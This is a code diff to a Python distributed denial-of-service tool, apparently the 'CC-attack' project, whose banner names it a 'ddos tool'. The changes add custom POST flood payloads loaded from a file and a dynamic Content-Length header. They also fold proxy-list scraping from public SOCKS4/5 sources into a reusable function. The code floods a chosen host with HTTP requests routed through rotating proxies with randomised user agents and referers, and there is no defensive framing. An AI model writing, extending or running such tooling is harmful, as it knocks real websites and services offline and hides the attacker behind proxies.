@@ -27,16 +27,16 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 3.1.1 (dirty fix)
+Python3 version 3.2 (Little Improvement)
                             C0d3d by L330n123
 ┌─────────────────────────────────────────────┐
 │        Tos: Don't attack .gov website       │
 ├─────────────────────────────────────────────┤
 │                 New stuff:                  │
+│          + Customize data of post mode      │
 │          + Fast Port Re-use                 │
 │          + Added Random client ip           │
 │          + Added socks mode selection       │
-│          + Fixed slow mode                  │
 ├─────────────────────────────────────────────┤
 │ Link: https://github.com/Leeon123/CC-attack │
 └─────────────────────────────────────────────┘''')
@@ -195,7 +195,7 @@ referers = [
 	"https://www.bing.com/search?q=",
 	"https://r.search.yahoo.com/",
 ]
-
+data = ""
 strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
 def cc(socks_type):
 	connection = "Connection: Keep-Alive\r\n"
@@ -239,13 +239,15 @@ def cc(socks_type):
 	cc(socks_type)
 
 def post(socks_type):
+	global data
 	post_host = "POST " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 	content = "Content-Type: application/x-www-form-urlencoded\r\n"
-	length = "Content-Length: 16 \r\nConnection: Keep-Alive\r\n"
 	refer = "Referer: http://"+ ip + url2 + "\r\n"
 	user_agent = "User-Agent: " + random.choice(useragents) + "\r\n"
 	accept = random.choice(acceptall)
-	data = str(random._urandom(16)) # You can enable bring data in HTTP Header
+	if mode2 != "y":
+		data = str(random._urandom(16)) # You can enable bring data in HTTP Header
+	length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
 	request = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
 	proxy = random.choice(proxies).strip().split(":")
 	err = 0
@@ -432,7 +434,56 @@ def check_list(socks_file):
 	for i in list(temp_list):
 		rfile.write(bytes(i,encoding='utf-8'))
 	rfile.close()
-
+def downloadsocks(choice):
+	if choice == "4":
+		f = open("socks4.txt",'wb')
+		try:
+			r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&timeout=1000")
+			f.write(r.content)
+		except:
+			pass
+		try:
+			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4")
+			f.write(r.content)
+			f.close()
+		except:
+			f.close()
+		try:#credit to All3xJ
+			import urllib.request
+			req = urllib.request.Request("https://www.socks-proxy.net/")
+			req.add_header("User-Agent", random.choice(useragents))
+			sourcecode = urllib.request.urlopen(req)
+			part = str(sourcecode.read())
+			part = part.split("<tbody>")
+			part = part[1].split("</tbody>")
+			part = part[0].split("<tr><td>")
+			proxies = ""
+			for proxy in part:
+				proxy = proxy.split("</td><td>")
+				try:
+					proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
+				except:
+					pass
+				out_file = open("socks4.txt","a")
+				out_file.write(proxies)
+				out_file.close()
+		except:
+			pass
+		print("> Have already downloaded socks4 list as socks4.txt")
+	if choice == "5":
+		f = open("socks5.txt",'wb')
+		try:
+			r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all")
+			f.write(r.content)
+		except:
+			pass
+		try:
+			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
+			f.write(r.content)
+			f.close()
+		except:
+			f.close()
+		print("> Have already downloaded socks5 list as socks5.txt")
 def main():
 	global ip
 	global url2
@@ -440,16 +491,21 @@ def main():
 	global proxies
 	global multiple
 	global choice
+	global data
+	global mode2
 	ip = ""
 	port = ""
 	print("> Mode: [cc/post/slow/check]")
-	mode = str(input("> Choose Your Mode (default=cc) :"))
+	mode = str(input("> Choose Your Mode (default=cc) :")).strip()
 	if mode == "":
 		mode = "cc"
+	elif(mode != "cc") and (mode != "post")and(mode != "slow" )and(mode !="check"):
+		print("> Plese enter correct mode")
+		sys.exit(1)
 	ip = str(input("> Host/Ip:"))
 	if ip == "":
 		print("> Plese enter correct host or ip")
-		sys.exit(0)
+		sys.exit(1)
 	if mode == "slow" or mode == "check":
 		pass
 	else:
@@ -466,6 +522,11 @@ def main():
 		port = int(port)
 		if str(port) == '443':
 			print("> [!] Enable SSL Mode")
+	if mode == "post":
+		mode2 = str(input("> Customize post data? (y/n, default=n):")).strip()
+		if mode2 == "y":
+			data = open(input("> Input the file's path:").strip()).readlines()
+			data = ' '.join([str(txt) for txt in data]) 
 	choice = ""
 	while choice == "":
 		choice = str(input("> Choose your socks mode(4/5, default=5):")).strip()
@@ -480,55 +541,7 @@ def main():
 	if mode == "check":
 		N = str(input("> Do you need to get socks list?(y/n,default=y):"))
 		if N == 'y' or N == "" :
-			if choice == "4":
-				f = open("socks4.txt",'wb')
-				try:
-					r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&timeout=1000")
-					f.write(r.content)
-				except:
-					pass
-				try:
-					r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4")
-					f.write(r.content)
-					f.close()
-				except:
-					f.close()
-				try:#credit to All3xJ
-					import urllib.request
-					req = urllib.request.Request("https://www.socks-proxy.net/")
-					req.add_header("User-Agent", random.choice(useragents))
-					sourcecode = urllib.request.urlopen(req)
-					part = str(sourcecode.read())
-					part = part.split("<tbody>")
-					part = part[1].split("</tbody>")
-					part = part[0].split("<tr><td>")
-					proxies = ""
-					for proxy in part:
-						proxy = proxy.split("</td><td>")
-						try:
-							proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
-						except:
-							pass
-					out_file = open("socks4.txt","a")
-					out_file.write(proxies)
-					out_file.close()
-				except:
-					pass
-				print("> Have already downloaded socks4 list as socks4.txt")
-			if choice == "5":
-				f = open("socks5.txt",'wb')
-				try:
-					r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all")
-					f.write(r.content)
-				except:
-					pass
-				try:
-					r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
-					f.write(r.content)
-					f.close()
-				except:
-					f.close()
-				print("> Have already downloaded socks5 list as socks5.txt")
+			downloadsocks(choice)
 		else:
 			pass
 		if choice == "4":
@@ -577,55 +590,7 @@ def main():
 			sys.exit("Error thread number")
 	N = str(input("> Do you need to get socks list?(y/n,default=y):"))
 	if N == 'y' or N == "" :
-		if choice == "4":
-			f = open("socks4.txt",'wb')
-			try:
-				r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&timeout=1000")
-				f.write(r.content)
-			except:
-				pass
-			try:
-				r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4")
-				f.write(r.content)
-				f.close()
-			except:
-				f.close()
-			try:#credit to All3xJ
-				import urllib.request
-				req = urllib.request.Request("https://www.socks-proxy.net/")
-				req.add_header("User-Agent", random.choice(useragents))
-				sourcecode = urllib.request.urlopen(req)
-				part = str(sourcecode.read())
-				part = part.split("<tbody>")
-				part = part[1].split("</tbody>")
-				part = part[0].split("<tr><td>")
-				proxies = ""
-				for proxy in part:
-					proxy = proxy.split("</td><td>")
-					try:
-						proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
-					except:
-						pass
-				out_file = open("socks4.txt","a")
-				out_file.write(proxies)
-				out_file.close()
-			except:
-				pass
-			print("> Have already downloaded socks4 list as socks4.txt")
-		if choice == "5":
-			f = open("socks5.txt",'wb')
-			try:
-				r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all")
-				f.write(r.content)
-			except:
-				pass
-			try:
-				r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
-				f.write(r.content)
-				f.close()
-			except:
-				f.close()
-			print("> Have already downloaded socks5 list as socks5.txt")
+		downloadsocks(choice)
 	else:
 		pass
 	if choice == "4":
